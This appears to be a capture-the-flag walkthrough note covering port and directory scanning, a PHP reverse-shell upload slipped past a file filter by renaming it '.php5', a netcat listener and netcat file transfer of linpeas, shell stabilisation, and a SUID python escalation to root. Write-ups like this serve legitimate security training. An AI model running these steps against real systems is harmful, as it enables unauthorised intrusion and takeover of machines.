```
nmap -sC -sV -Pn -T3 -oN nmap/initial $IP
gobuster dir -u "http://$IP" -w /opt/wordlists/big.txt -t 16 | tee gobuster.log
```

Upload my phprev.php shell to /panel/
Didn't work. Renamed to `phprev.php5`
That worked. Launch reverse shell
```
nc -lnvp 1234
```

Stabilize shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z.
stty raw -echo;
fg
```

Find user.txt
```
find / -name user.txt
/var/www/user.txt
```

# linpeas!
target terminal:
```
nc -l -p 1234 > /tmp/jake &
```

my terminal:
```
nc $IP $PORT < linpeas.sh
```

Finally, run:
```
chmod +x /tmp/jake
/tmp/jake
```

We see that python is vulnerable. From GTFOBins:
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
And we have root!
